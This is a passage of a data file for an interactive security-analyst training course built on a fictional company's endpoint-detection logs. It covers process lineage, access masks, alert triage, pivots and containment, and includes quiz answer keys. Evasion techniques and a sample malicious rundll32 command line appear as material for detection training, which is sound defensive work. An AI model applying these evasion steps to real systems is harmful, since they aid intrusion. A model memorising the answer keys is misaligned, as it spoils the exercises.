            label: "A worked read: a database server",
            lines: [
              "`sqlservr.exe` started `cmd.exe`.",
              "A database has no honest reason to open a shell, so that pairing is the finding.",
              "The next question is what that shell was told to do.",
            ],
          },
          fold: true,
        },
        buckets: [
          { id: "ok", label: "Everyday pairing" },
          { id: "bad", label: "Anomaly" },
          { id: "more", label: "Not enough to say" },
        ],
        items: [
          { id: "t1", text: "Teams.exe started msedge.exe to open a link", bucket: "ok", why: "An app handing a link to the default browser is what that link is for." },
          { id: "t2", text: "services.exe started svchost.exe -k netsvcs", bucket: "ok", why: "That is how Windows hosts its services." },
          { id: "t3", text: "A signed installer started rundll32.exe on a DLL under Program Files", bucket: "ok", why: "Same binary as an attack, with a normal parent and a routine path." },
          { id: "t4", text: "MSACCESS.EXE started cscript.exe", bucket: "bad", why: "A database front end shows records. It has no reason to start a script engine, which is the shape a malicious macro leaves." },
          { id: "t5", text: "OUTLOOK.EXE started cmd.exe /c", bucket: "bad", why: "A mail client opening a shell has no business reason to exist." },
          { id: "t6", text: "POWERPNT.EXE started mshta.exe with a URL", bucket: "bad", why: "An Office parent, a LOLBin and a remote destination: all three questions answer themselves." },
          { id: "t7", text: "certutil.exe ran. That's all the alert line says", bucket: "more", why: "No parent, no arguments. Hashing a file and fetching one from the internet look identical at this level." },
          { id: "t8", text: "A Microsoft-signed rundll32.exe running from System32", bucket: "more", why: "Every rundll32.exe on every Windows machine looks like this, so nothing here separates one run from another." },
          { id: "t9", text: "mshta.exe with a clean reputation score", bucket: "more", why: "That score belongs to the program, and the program is the same on every run. This line doesn't say what this run did." },
        ],
      },
      {
        kind: "duel",
        title: "What Still Sees It",
        prompt: "Mateusz's favourite drill: the intruder plays a way of staying hidden, and you play the telemetry that still catches it. A sensor can only report what it recorded, and two of your cards record nothing useful here.",
        primer: {
          title: "Hiding from what?",
          points: [
            "Most evasion hides from one kind of check: a file scan, a person reading a name, a log on the host.",
            "The sensor sits on the endpoint and records behaviour as it happens, then streams it off the machine.",
            "So ask of every trick: **what did it hide from, and what did it still have to do?** Whatever it still had to do left a record.",
          ],
          example: {
            label: "A worked read: a backdated file",
            lines: [
              "Move: the attacker sets a file's created date back to 2019, so it looks old.",
              "It hid from a person reading dates in a folder.",
              "It still had to write the file, and the sensor stamped that write with its own time.",
            ],
          },
          fold: true,
        },
        attacker: "The intruder",
        moves: [
          { id: "m1", move: "Renames its upload tool fontsvc.exe and parks it in ProgramData", detail: "The name reads like a Windows service, and an analyst skimming the list moves on.", counter: "path", hint: "A name costs nothing. What can't it fake so easily?", why: "A name proves nothing until you check who signed the file, and whether any installer ever put it there." },
          { id: "m2", move: "Runs its script through mshta.exe", detail: "The binary is Microsoft's, it sits in System32, and every reputation check on its hash comes back clean.", counter: "lineage", hint: "The file is genuine. What about how it was used?", why: "A LOLBin hides from anything that judges the file. It can't hide what started it or what it was told to run, and that pairing is the finding." },
          { id: "m3", move: "Injects into a running browser instead of starting anything new", detail: "No new process means no new node in the tree and no parent-child link to read.", counter: "access", hint: "Which record doesn't depend on a parent and a child?", why: "It still had to open a handle on another process. The access event shows who reached, what rights it asked for, and which process it reached." },
          { id: "m4", move: "Deletes its dropper once it has run", detail: "By the time anyone looks, the file is gone from disk.", counter: "hash", hint: "What was taken before the file disappeared?", why: "The sensor took the fingerprint when the file ran. The hash outlives the file, so you can still search the fleet for it." },
          { id: "m5", move: "Clears the Windows Security log with wevtutil", detail: "The local record of last night is gone in one command.", counter: "cloud", hint: "Where was the record by the time the log was cleared?", why: "The events had already left the machine, and wevtutil.exe itself is a process with a command line. Clearing a log removes a copy, and the act of clearing is one more line of evidence." },
        ],
        cards: [
          { id: "severity", name: "SeverityName", effect: "The tool's rating of a pattern. It records no behaviour." },
          { id: "access", name: "Process access event", effect: "One process asking for a handle on another, with the rights it asked for." },
          { id: "lineage", name: "Parent and command line", effect: "Who started it, and with what arguments." },
          { id: "firewall", name: "Firewall log", effect: "Packets at the boundary, with no process attached." },
          { id: "path", name: "File path and signer", effect: "Where the binary lives, and who vouches for it." },
          { id: "cloud", name: "Telemetry in the cloud", effect: "Events the sensor streamed off the host as they happened." },
          { id: "hash", name: "SHA256 at execution", effect: "The fingerprint the sensor took when the file ran." },
        ],
        lesson: "Evasion hides from a check, not from everything. A name fools a reader, a signed binary fools a file scan, injection fools a tree, deleting fools a disk search and clearing fools a host log. None of them changes what the sensor already recorded, so ask what the trick still had to do.",
      },
      {
        kind: "worksheet",
        title: "Whose Hand, Whose Memory?",
        prompt: "Four process access events from Kilnworth's fleet this week. In each, one process asked for a handle on another. Work out who reached for whom, and what the mask really allows.",
        primer: {
          title: "Reading an access mask",
          points: [
            "`DesiredAccess` lists the rights a process asked for, as bits added together.",
            "The bits: `0x0002` create a thread, `0x0008` allocate memory, `0x0010` read memory, `0x0020` write memory, `0x0400` query, `0x1000` limited query. `0x1FFFFF` is every right there is, called `PROCESS_ALL_ACCESS`.",
            "The console writes the mask in decimal, so convert it before you read it.",
            "`lsass.exe` holds the hashes and tickets of signed-in users, so reading its memory is what a credential dumper is after.",
          ],
          example: {
            label: "A worked read: a mask of 4112",
            lines: [
              "4112 in hex is `0x1010`.",
              "That is `0x1000` plus `0x0010`: limited query and read memory.",
              "It can read its target, and it can't write there or start a thread.",
            ],
          },
          fold: true,
        },
        caption: "Process access events · last 7 days",
        columns: ["ImageFileName", "TargetProcessImageFileName", "DesiredAccess", "In hex"],
        rows: [
          ["\\Device\\HarddiskVolume3\\Program Files\\Kilnworth\\KilnAgent\\KilnAgent.exe", "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe", "4096", "0x1000"],
          ["\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe", "\\Device\\HarddiskVolume3\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "5178", "0x143A"],
          ["\\Device\\HarddiskVolume3\\Windows\\System32\\WerFault.exe", "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "5136", "0x1410"],
          ["\\Device\\HarddiskVolume3\\Program Files\\Kilnworth\\PrinterSetup\\PrinterSetup.exe", "\\Device\\HarddiskVolume3\\Program Files\\Kilnworth\\PrinterSetup\\setup_helper.exe", "2097151", "0x1FFFFF"],
        ],
        questions: [
          { id: "write", q: "Leave out the row that asks for everything. Which process asked for write memory and create thread? (its file name)", hint: "Split each hex value into the bits from the primer.", answer: ["rundll32.exe", "rundll32", "\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe"], why: "0x143A is 0x1000 + 0x0400 + 0x0020 + 0x0010 + 0x0008 + 0x0002: query, read, write, allocate and start a thread. That is what injection needs." },
          { id: "victim", q: "In that same row, whose memory is at risk? (its file name)", hint: "Which column is the one being reached?", answer: ["msedge.exe", "msedge", "\\Device\\HarddiskVolume3\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"], why: "ImageFileName acts and TargetProcessImageFileName is acted on. Read them backwards and you accuse the victim." },
          { id: "agent", q: "KilnAgent.exe touched lsass.exe. Could that mask read lsass.exe's memory? (yes/no)", hint: "Is 0x0010 in 0x1000?", answer: ["no"], why: "0x1000 is limited query: a name and a status, no memory. Security and inventory agents do this all day. The question is never whether something touched LSASS but what it asked for." },
          { id: "full", q: "PrinterSetup.exe asked for everything. Is that alarming against this target? (yes/no)", hint: "What is setup_helper.exe to PrinterSetup.exe?", answer: ["no"], why: "A process gets a full handle on a child it has just created. A mask only means something together with its target, so the same mask on a process that holds secrets is a very different finding." },
        ],
      },
    ],
    // ── Reading 5: siblings ──
    "edr-r5": [
      {
        kind: "worksheet",
        title: "Three Tickets or One Story?",
        prompt: "The morning's detections, oldest first. A hurried analyst would open seven tickets. Mateusz wants you to read them the way the tool grouped them, then check that the grouping means what you think.",
        primer: {
          title: "Why one host fires many detections",
          points: [
            "Behaviour detection raises a separate alert for each technique step, so one intrusion arrives as several small tickets.",
            "`AggregateId` has the form `aggind:<sensor id>:<tree id>`. Behaviours that share it were tied by the tool to one process tree.",
            "Read them in order. A quiet early step can be the one that outlives the headline detection.",
            "The habit is to **check** for correlation, not to assume it. A busy patch night makes a cluster that means nothing.",
          ],
          example: {
            label: "A worked read: a warehouse PC",
            lines: [
              "11:02, Low: a new service. 11:05, Medium: a tool arrives. 11:20, High: a share sweep. All one AggregateId.",
              "Alone, the service looks like IT housekeeping.",
              "In order, it is the way back in, and it stays after the sweep is cleaned up.",
            ],
          },
          fold: true,
        },
        caption: "Endpoint detections · Sunday 23:00 to Monday 07:00",
        columns: ["Time", "Host", "Tactic & technique", "Severity", "AggregateId"],
        rows: [
          ["Sun 23:46", "KW-GLZ-WS04", "Persistence via Boot or Logon Autostart Execution", "Low", "aggind:a5767b00...:4318820551"],
          ["Mon 01:20", "KW-GLZ-WS04", "Machine Learning via Sensor-based ML", "Low", "aggind:a5767b00...:4318902217"],
          ["Mon 04:05", "KW-IT-WS02", "Execution via Command and Scripting Interpreter", "Medium", "aggind:e07d31c2...:1190427733"],
          ["Mon 04:12", "KW-IT-WS02", "Discovery via System Information Discovery", "Medium", "aggind:e07d31c2...:1190427981"],
          ["Mon 04:19", "KW-IT-WS02", "Stealth via Masquerading", "Medium", "aggind:e07d31c2...:1190428204"],
          ["Mon 06:31", "KW-GLZ-WS04", "Collection via Archive Collected Data", "Medium", "aggind:a5767b00...:4318820551"],
          ["Mon 06:52", "KW-GLZ-WS04", "Exfiltration via Exfiltration Over Web Service", "Critical", "aggind:a5767b00...:4318820551"],
        ],
        questions: [
          { id: "count", q: "How many of the KW-GLZ-WS04 behaviours belong to the Critical's tree?", hint: "Compare the last part of the AggregateId, not just the host.", answer: ["3", "three"], why: "Three share one id. The 01:20 row is on the same host but in another tree: it was a signed driver updater. Same host and close in time isn't enough." },
          { id: "survive", q: "You clean up only the Critical. Which tactic's behaviour is still waiting when the machine restarts?", hint: "Which one was written to outlive a process?", answer: ["persistence", "run key", "registry"], why: "The Low from 23:46 wrote a Run key seven hours before the Critical. Close it as a routine notice and the headline gets cleaned while the way back in stays." },
          { id: "it", q: "KW-IT-WS02 has three Mediums in a quarter of an hour. Are they one story? (yes/no)", hint: "Compare their tree ids, then think about what runs at 04:00 on a Monday.", answer: ["no"], why: "Three trees, from the monthly patch run. The check is what separates this cluster from the real one." },
        ],
      },
    ],
    // ── Reading 6: severity reassessment ──
    "edr-r6": [
      {
        kind: "queue",
        title: "Same Rating, Different Truth",
        prompt: "Four cases from last year's files: one technique, one rating, and a tool that couldn't tell them apart. That judgement is the job. Each one carries the note IT gave at the time: read the fields and the note, then give the verdict.",
        primer: {
          title: "Three verdicts, and how to reach them",
          points: [
            "**True positive:** real activity, not authorised.",
            "**Benign true positive:** the rule was right and the activity was real, but it was authorised.",
            "**False positive:** the rule misfired, and the behaviour never happened.",
            "Ask: whose account is this, a service with a documented purpose or a person acting oddly? Is there a change ticket? Does it name **this host and this window**? Is the file signed by a publisher you use? How sensitive is the asset?",
            "Severity was set before any of those answers existed, so it can't decide this.",
          ],
          example: {
            label: "A worked read: a booked penetration test",
            lines: [
              "`nmap.exe` fires High on a tester's laptop at 10:00.",
              "The scan is real and the rule is right, and the signed test plan names this laptop and this hour.",
              "Benign true positive. The same scan with no plan is a true positive. An alert on a file merely named nmap_notes.txt is a false positive.",
            ],
          },
          fold: true,
        },
        console: "EDR console · Closed detections",
        actions: [
          { id: "tp", label: "True positive", tone: "escalate" },
          { id: "btp", label: "Benign true positive", tone: "close" },
          { id: "fp", label: "False positive", tone: "close" },
        ],
        alerts: [
          {
            id: "a1", time: "10:14", severity: "High", rule: "Stealth via System Binary Proxy Execution", entity: "KW-PRT-01",
            fields: [{ k: "CommandLine", v: "rundll32.exe printui.dll,PrintUIEntry /ia /m \"Kiln Label 400\" /f C:\\Deploy\\Drivers\\kl400.inf" }, { k: "ParentImageFileName", v:"PrintDeploy.exe" }, { k: "UserName", v: "svc-printdeploy" }, { k: "PatternDispositionDescription", v: "Detection, standard detection." }],
            context: "IT: change CHG-20771 covers this driver push to KW-PRT-01, that morning, 10:00 to 11:00. svc-printdeploy is the print deployment account.",
            answer: "btp",
            why: "Rule right, behaviour real, and authorised: the right account, on the host and in the window the ticket names.",
          },
          {
            id: "a2", time: "10:31", severity: "High", rule: "Stealth via System Binary Proxy Execution", entity: "KW-SLS-LT05",
            fields: [{ k: "CommandLine", v: "rundll32.exe printui.dll,PrintUIEntry /ia /m \"Kiln Label 400\" /f C:\\Users\\j.marsh\\Downloads\\kl400.inf" }, { k: "ParentImageFileName", v:"cmd.exe" }, { k: "UserName", v: "j.marsh" }, { k: "PatternDispositionDescription", v: "Detection, standard detection." }],
            context: "IT: CHG-20771 covered KW-PRT-01 only. Nobody asked Sales to install a driver, and that file isn't the one we ship.",
            answer: "tp",
            why: "Nearly the same command, and that is the trap. A ticket only counts for the host, the account and the window it names. This is a person's account, a driver from Downloads, and no authorisation.",
          },
          {
            id: "a3", time: "11:02", severity: "High", rule: "Stealth via System Binary Proxy Execution", entity: "KW-HR-WS09",
            fields: [{ k: "CommandLine", v: "notepad.exe C:\\Users\\m.adler\\Documents\\mshta_cleanup_notes.txt" }, { k: "ParentImageFileName", v:"explorer.exe" }, { k: "UserName", v: "m.adler" }, { k: "PatternDispositionDescription", v: "Detection, standard detection." }],
            context: "IT: this came from our custom rule, which matches the text mshta anywhere in a command line. Nothing was proxied through anything.",
            answer: "fp",
            why: "The behaviour never happened: the rule matched a word in a file name. Benign true positive would mean it was real and allowed. False positive sends someone to fix the rule.",
          },
          {
            id: "a4", time: "11:20", severity: "High", rule: "Stealth via System Binary Proxy Execution", entity: "KW-EXE-LT01",
            fields: [{ k: "CommandLine", v: "rundll32.exe C:\\Windows\\Temp\\t.dll,Init" }, { k: "ParentImageFileName", v:"wmiprvse.exe" }, { k: "UserName", v: "adm-r.hale" }, { k: "PatternDispositionDescription", v: "Prevention, process killed." }],
            context: "IT: there was no change open on the managing director's laptop, and r.hale was on leave that week.",
            answer: "tp",
            why: "Blocked isn't the same as benign. An admin account in use during leave, no ticket, a DLL from Temp, on the laptop with the most to lose: the same rating as the print job, and nothing like it.",
          },
        ],
      },
    ],
    // ── Reading 7: pivot and scope ──
    "edr-r7": [
      {
        kind: "trace",
        title: "A Third Host at 14:20",
        prompt: "The morning's scope said two hosts. Then a maintenance laptop came back on after a morning switched off, and its first events landed. Follow it through the pivots the way Mateusz would, and add each finding to the case board.",
        primer: {
          title: "What each pivot can and can't tell you",
          points: [
            "**Reputation:** many vendors flagging a hash removes most doubt. Zero flags doesn't clear it, because a new or custom tool has no reputation yet.",
            "**File and network:** what else this process touched. An outbound address, a file written, a registry key set for persistence.",
            "**Fleet:** a name can change and a hash can't. The same hash on another host is the same file, whatever it is called there.",
          ],
          example: {
            label: "A worked read: two invoices",
            lines: [
              "`invoice.pdf.exe` on one desk and `scan_0417.exe` on another share one SHA256.",
              "Different names, one file.",
              "`invoice.pdf.exe` on a third desk with another hash is a different file.",
            ],
          },
          fold: true,
        },
        lead: "Monday 14:20. KW-MNT-WS03, a maintenance laptop, was switched off all morning. It came back on at 13:50, and its events have just landed.",
        steps: [
          {
            id: "rep",
            ask: "Which file stays on your list, however clean its score looks?",
            source: "Hash lookup · files used on KW-MNT-WS03 since 13:50",
            columns: ["File", "Engines flagging", "First seen anywhere", "Signer"],
            rows: [
              ["KilnTune_Setup.msi", "0 of 71", "2024", "KilnTune Systems Ltd"],
              ["vc_redist.x64.exe", "0 of 71", "2023", "Microsoft Corporation"],
              ["mshelper.dll", "0 of 71", "Friday", "None"],
              ["splwow64.exe", "0 of 71", "2019", "Microsoft Windows"],
            ],
            answer: 2,
            why: "Four clean scores, and three of them mean something: years old and signed by a publisher you know. mshelper.dll is unsigned and days old, so its zero means nobody has met it yet.",
            learned: "mshelper.dll: 0 engines, unsigned, first seen Friday. Clean is not cleared.",
          },
          {
            id: "pers",
            ask: "What would bring this back after a restart?",
            source: "Process activity · rundll32.exe · KW-MNT-WS03",
            columns: ["Time", "Type", "Detail"],
            rows: [
              ["13:52", "DNS", "kilntune-support.example"],
              ["13:54", "Registry", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, value KilnTune"],
              ["13:55", "File", "C:\\ProgramData\\KilnTune\\p.tmp written"],
              ["13:55", "Network", "203.0.113.58:443, 1.2 KB out"],
            ],
            answer: 1,
            why: "The Run key survives a reboot. The DNS request and the connection tie this laptop to the morning's server, and the temp file is a byproduct.",
            learned: "A Run key, and the same server as this morning. This is no stray install.",
          },
          {
            id: "same",
            ask: "Select the row that holds this morning's file under another name.",
            source: "Event search · file names kt.dll or mshelper.dll · all hosts",
            columns: ["Hostname", "File", "SHA256", "Signer"],
            rows: [
              ["KW-GLZ-WS04", "kt.dll", "1ac63083...0527c7", "None"],
              ["KW-STU-WS11", "kt.dll", "91ac33e2...b7410e", "KilnTune Systems Ltd"],
              ["KW-PLN-WS07", "kt.dll", "1ac63083...0527c7", "None"],
              ["KW-MNT-WS03", "mshelper.dll", "1ac63083...0527c7", "None"],
            ],
            answer: 3,
            why: "A new name and the same SHA256: same file, third host. KW-STU-WS11 shares the name and not the hash: the real product's own DLL.",
            learned: "Same SHA256, same file, third host.",
          },
          {
            id: "acct",
            ask: "The session that ran the foothold is the first credential to rotate. Which row gives you the account?",
            source: "Process list · KW-MNT-WS03 · 13:50 to 14:00",
            columns: ["Process", "UserName", "Parent"],
            rows: [
              ["rundll32.exe", "KILNWORTH\\t.vance", "powershell.exe"],
              ["KilnAgent.exe", "NT AUTHORITY\\SYSTEM", "services.exe"],
              ["svchost.exe", "NT AUTHORITY\\NETWORK SERVICE", "services.exe"],
              ["OneDrive.exe", "KILNWORTH\\t.vance", "explorer.exe"],
            ],
            answer: 0,
            why: "UserName on the malicious process is the session it ran in, so that credential is treated as exposed first. The same name on OneDrive.exe is the same person, but only the rundll32.exe row proves it.",
            learned: "t.vance's session ran the foothold: rotate that first.",
          },
        ],
      },
      {
        kind: "simulate",
        title: "What Each Response Costs",
        prompt: "KW-MNT-WS03 is calling out, and the maintenance manager wants it dealt with now. Everybody in the room has a suggestion. Try each one and read what it does and doesn't do.",
        checks: [
          { name: "Running implant cut off", question: "Can the implant already running still reach anything?" },
          { name: "New runs stopped", question: "Can the same file still start here or on another host?" },
          { name: "Account dealt with", question: "Does the session's account stop working?" },
          { name: "Laptop stays in use", question: "Can maintenance carry on with it?" },
        ],
        scenarios: [
          { id: "account", label: "Disable t.vance's account in the directory", detail: "One change, and that sign-in stops working everywhere.", results: ["fail", "fail", "pass", "fail"], why: ["A process that is already running doesn't need the account again.", "The file is still on disk, and other hosts are untouched.", "New sign-ins with that account fail.", "Nobody can log on to do the job until the account is back."], verdict: "It deals with the account and leaves the implant running." },
          { id: "sinkhole", label: "Sinkhole kilntune-support.example", detail: "Internal DNS answers that name with a dead address.", results: ["fail", "fail", "fail", "pass"], why: ["It stops new lookups of the name. A connection already open to 203.0.113.58 doesn't need DNS.", "The file starts as before, because only the name stopped resolving.", "Nothing here touches an account.", "The laptop carries on."], verdict: "A good way to see who else asks for that name, and no way to stop this host." },
          { id: "block", label: "Deny 203.0.113.58 at the firewall", detail: "One rule on the boundary.", results: ["fail", "fail", "fail", "pass"], why: ["Only that address. A second server, or anything on the local network, still works.", "The file still starts. It just can't reach that one server.", "Nothing here touches an account.", "The laptop carries on."], verdict: "A useful extra, and no substitute for acting on the host." },
          { id: "hash", label: "Add the file's hash to the EDR block list", detail: "The sensor refuses that SHA256 from now on.", results: ["fail", "pass", "fail", "pass"], why: ["A block acts when the file next tries to run. The copy already in memory carries on.", "Every host on the policy refuses it, whatever the file is called there.", "Nothing here touches an account.", "The laptop carries on."], verdict: "It protects the next host, and it doesn't reach this one's running copy." },
          { id: "contain", label: "Network contain from the console", detail: "Everything is cut except the link to the cloud console.", results: ["pass", "fail", "fail", "fail"], why: ["The implant can't reach anything, and the link it leaves is the one you work over.", "It acts on this host alone.", "The account still works on every other machine.", "The laptop is off the network until you release it."], verdict: "The only row that reaches the running implant, and you keep your way in. It costs a working laptop, and it leaves the account and the other hosts for the next decisions." },
        ],
      },
      {
        kind: "outbreak",
        title: "Cut Ahead of It",
        prompt: "Mateusz's what-if for Friday's review: the same foothold, but suppose the attacker had also stolen an IT support account that works on every desk. Isolate one host a turn and keep the recipes server from falling.",
        primer: {
          title: "Where to cut",
          points: [
            "The spread moves one link a turn, so a host it already holds is lost. Cutting behind it saves nothing.",
            "Look at where it could go next, and cut at the place the network narrows.",
            "An isolated host stays powered on and stays yours to investigate. That is network containment.",
          ],
          example: {
            label: "A worked read: two offices",
            lines: [
              "Ten desks in one office reach ten in another through a single server.",
              "Isolating a desk saves one desk.",
              "Isolating that server, before it is reached, saves the whole second office.",
            ],
          },
          fold: true,
        },
        hostPrefix: "KW",
        cols: 6,
        rows: 5,
        crown: "RECIPES",
        via: "WinRM with a stolen IT support account",
        lesson: "Containment is a race with a shape: a cut behind the spread saves nothing, and a cut ahead of it saves everything behind it. That is why the fleet search comes before the first containment. You can't cut ahead of a spread you haven't mapped.",
      },
    ],
    // ── The last branch: warm-up for the hand-written hunt ──
    "edr-qf1": [
      {
        kind: "worksheet",
        title: "Which Way Is Up?",
        prompt: "Mateusz has a second tool to chase: pf.exe, hash c41e9a03. A good analyst can work in either console, so here are the same hosts the way Microsoft Defender's Advanced Hunting shows them. Read the rows as two different questions: where did it run, and what did it start?",
        primer: {
          title: "Two hashes on one row",
          points: [
            "Each row of this table is one process that started. `FileName`, `ProcessCommandLine` and `SHA256` describe that process.",
            "Every column beginning `InitiatingProcess` describes the process **one level up**, the one that launched it.",
            "So one hash can sit in either column, and each answers a different question: what is it, or what did it start?",
          ],
          example: {
            label: "A worked read: one row",
            lines: [
              "`FileName` is `notepad.exe`, `InitiatingProcessFileName` is `explorer.exe`.",
              "`notepad.exe` is what started. `explorer.exe` is what started it.",
              "`InitiatingProcessCommandLine` on that row is explorer's command line, not notepad's.",
            ],
          },
          fold: true,
        },
        caption: "Advanced Hunting · DeviceProcessEvents · hashes shortened",
        columns: ["Timestamp", "DeviceName", "AccountName", "FileName", "SHA256", "InitiatingProcessFileName", "InitiatingProcessSHA256"],
        rows: [
          ["Sun 23:52", "kw-glz-ws04", "a.lindqvist", "pf.exe", "c41e9a03", "rundll32.exe", "7f2e40b1"],
          ["Sun 23:53", "kw-glz-ws04", "a.lindqvist", "whoami.exe", "77d2b0ce", "pf.exe", "c41e9a03"],
          ["Mon 05:43", "kw-pln-ws07", "s.brandt", "pf.exe", "c41e9a03", "rundll32.exe", "7f2e40b1"],
          ["Mon 05:44", "kw-pln-ws07", "s.brandt", "nltest.exe", "2ac9f6e1", "pf.exe", "c41e9a03"],
          ["Mon 09:10", "kw-it-ws02", "adm-l.ferris", "whoami.exe", "77d2b0ce", "cmd.exe", "0b6d3f52"],
          ["Mon 13:58", "kw-mnt-ws03", "t.vance", "pf.exe", "c41e9a03", "rundll32.exe", "7f2e40b1"],
          ["Mon 13:59", "kw-mnt-ws03", "t.vance", "net.exe", "e5183da7", "pf.exe", "c41e9a03"],
        ],
        questions: [
          { id: "ran", q: "On how many devices did pf.exe itself run?", hint: "Look for c41e9a03 in the column that describes the process on that row.", answer: ["3", "three"], why: "kw-glz-ws04, kw-pln-ws07 and kw-mnt-ws03. That is the first question: where is this file?" },
          { id: "child", q: "What did pf.exe go on to start on kw-pln-ws07?", hint: "Now look for c41e9a03 one level up.", answer: ["nltest.exe", "nltest"], why: "The same hash, in the other column. FileName on that row is the child, so this hunt shows what the tool did next rather than where it sits." },
          { id: "noise", q: "kw-it-ws02 ran whoami.exe too, with the same hash as the one pf.exe started. Is it part of this? (yes/no)", hint: "What launched it there?", answer: ["no"], why: "whoami.exe is a Windows tool with one hash everywhere. What matters is who started it, and here that is an admin's own cmd.exe." },
          { id: "parenthash", q: "All three pf.exe rows share one parent hash, 7f2e40b1. Would hunting on it narrow anything down? (yes/no)", hint: "What is that file?", answer: ["no"], why: "That is Windows' own rundll32.exe, on every host in the fleet. Pick the hash that is specific to the attacker's file." },
        ],
      },
      {
        kind: "anatomy",
        title: "The Record Behind the Hunt",
        prompt: "The next hunt starts from the process you worked in the log analysis task. The handle-operation record carries no hash, so here is UpdateHelper.exe's own process-start record, the one that carries the file's hash.",
        source: "EDR console · Process start (ProcessRollup2) · WKS-FIN-0231",
        fields: [
          { key: "ComputerName", value: "WKS-FIN-0231", label: "Where", note: "The finance workstation from the log analysis task." },
          { key: "ImageFileName", value: "\\Device\\HarddiskVolume3\\Users\\r.callahan\\AppData\\Local\\Temp\\UpdateHelper.exe", label: "Which binary", note: "The binary the team wants to follow across the fleet: the same ImageFileName as the acting process in the log analysis record." },
          { key: "SHA256HashData", value: "b7f3a92c518e6d4f0a1b8c37d2e9f645a1c8b3d7e2f094c6a8b1d3e5f7092c4a" },
        ],
        summary: "SHA256HashData is the file's fingerprint: all 64 characters, matched exactly. The final hunt gives you this value; your job there is to pick the table and the column to look for it in.",
      },
    ],
  },
};
